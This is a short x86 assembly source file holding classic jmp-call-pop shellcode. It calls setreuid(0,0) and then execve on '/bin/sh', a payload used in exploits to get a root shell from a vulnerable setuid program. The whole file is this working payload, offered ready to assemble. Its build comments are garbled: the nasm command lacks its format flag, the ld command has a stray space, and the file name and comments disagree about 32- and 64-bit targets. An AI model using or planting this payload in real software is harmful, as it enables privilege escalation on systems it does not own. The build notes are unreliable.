;--------------------------------------------------------------------------
; This is an shellcode in architecture x86
; For assembled the code: 
; 1. nasm elf32 shellcode_x86_64.asm -o shellcode.o
; 2. ld -m elf_i386 - o shellcode shellcode.o
; May be this code doesn't will work if you have an architectur 32 bits
;--------------------------------------------------------------------------
[SECTION .text]

global _start


_start:
        xor eax, eax
        mov al, 70              ;setreuid is syscall 70
        xor ebx, ebx
        xor ecx, ecx
        int 0x80

        jmp short ender

        starter:

        pop ebx                 ;get the address of the string
        xor eax, eax

        mov [ebx+7 ], al        ;put a NULL where the N is in the string
        mov [ebx+8 ], ebx       ;put the address of the string to where the
                                ;AAAA is
        mov [ebx+12], eax       ;put 4 null bytes into where the BBBB is
        mov al, 11              ;execve is syscall 11
        lea ecx, [ebx+8]        ;load the address of where the AAAA was
        lea edx, [ebx+12]       ;load the address of the NULLS
        int 0x80                ;call the kernel, WE HAVE A SHELL!

        ender:
        call starter
        db '/bin/shNAAAABBBB'
;--------------------------------------------------------------------------